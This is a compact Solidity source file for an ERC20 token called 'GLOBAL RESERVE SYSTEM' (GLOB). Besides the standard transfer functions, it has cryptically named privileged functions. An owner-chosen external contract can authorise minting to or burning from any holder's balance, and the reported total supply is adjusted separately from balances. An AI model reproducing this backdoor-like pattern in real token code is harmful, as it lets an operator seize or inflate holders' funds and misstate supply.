1 pragma solidity 0.5.13;
2 library SafeMath{
3     function add(uint256 a,uint256 b)internal pure returns(uint256){uint256 c=a+b;require(c>=a);return c;}
4 	function sub(uint256 a,uint256 b)internal pure returns(uint256){require(b<=a);uint256 c=a-b;return c;}}
5 interface IERC20{
6     function transferFrom(address sender,address recipient,uint256 amount)external returns(bool);
7     function allowance(address owner,address spender)external view returns(uint256);
8     function transfer(address recipient,uint256 amount)external returns(bool);
9     function approve(address spender,uint256 amount)external returns(bool);
10     function balanceOf(address account)external view returns(uint256);
11     function totalSupply()external view returns(uint256);
12     event Approval(address indexed owner,address indexed spender,uint256 value);
13     event Transfer(address indexed from,address indexed to,uint256 value);}
14 interface Out{function check(address w)external view returns(bool);}
15 contract ROOT is IERC20{
16     using SafeMath for uint256;	function()external{revert();}
17 	string private _name; string private _symbol;
18 	uint8 private _decimals; uint256 private _totalSupply;
19 	mapping(address=>uint256)private _balances;
20 	mapping(address=>mapping(address=>uint256))private _allowances;
21 	function name()public view returns(string memory){return _name;}
22 	function symbol()public view returns(string memory){return _symbol;}
23 	function decimals()public view returns(uint8){return _decimals;}
24 	function totalSupply()public view returns(uint256){return _totalSupply;}
25     function balanceOf(address account)public view returns(uint256){return _balances[account];}	
26     function allowance(address owner,address spender)public view returns(uint256){return _allowances[owner][spender];}
27 	function transfer(address recipient,uint256 amount)public returns(bool){_transfer(msg.sender,recipient,amount);return true;}
28     function approve(address spender,uint256 amount)public returns(bool){_approve(msg.sender,spender,amount);return true;}
29     function transferFrom(address sender,address recipient,uint256 amount)public returns(bool){_transfer(sender,recipient,amount);
30         _approve(sender,msg.sender,_allowances[sender][msg.sender].sub(amount));return true;}
31     function increaseAllowance(address spender,uint256 addedValue)public returns(bool){
32 		_approve(msg.sender,spender,_allowances[msg.sender][spender].add(addedValue));return true;}
33     function decreaseAllowance(address spender,uint256 subtractedValue)public returns(bool){
34 	    _approve(msg.sender,spender,_allowances[msg.sender][spender].sub(subtractedValue));return true;}
35 	function _transfer(address sender,address recipient,uint256 amount)internal{require(sender!=address(0));
36         require(recipient!=address(0));_balances[sender]=_balances[sender].sub(amount);
37         _balances[recipient]=_balances[recipient].add(amount);emit Transfer(sender,recipient,amount);}
38 	function _approve(address owner,address spender,uint256 amount)internal{require(owner!=address(0));
39         require(spender!=address(0));_allowances[owner][spender]=amount;emit Approval(owner,spender,amount);}
40     address private own;address private uni;modifier onlyOwn{require(own==msg.sender);_;} 
41     modifier infra{require(Out(uni).check(msg.sender));_;}
42 	function _mint(address w,uint256 a)private returns(bool){require(w!=address(0));_balances[w]=_balances[w].add(a);return true;}
43 	function _burn(address w,uint256 a)private returns(bool){require(w!=address(0));_balances[w]=_balances[w].sub(a);return true;}
44     function mint(address w,uint256 a)external infra returns(bool){require(_mint(w,a));return true;}
45 	function burn(address w,uint256 a)external infra returns(bool){require(_burn(w,a));return true;}
46 	function addsu(uint256 a)external infra returns(bool){_totalSupply=_totalSupply.add(a);return true;}
47     function subsu(uint256 a)external infra returns(bool){_totalSupply=_totalSupply.sub(a);return true;}
48     function setuni(address a)external onlyOwn returns(bool){uni=a;return true;}
49 	constructor()public{_name="GLOBAL RESERVE SYSTEM";_symbol="GLOB";_decimals=18;_totalSupply=10**25;own=msg.sender;_balances[own]=_totalSupply;}}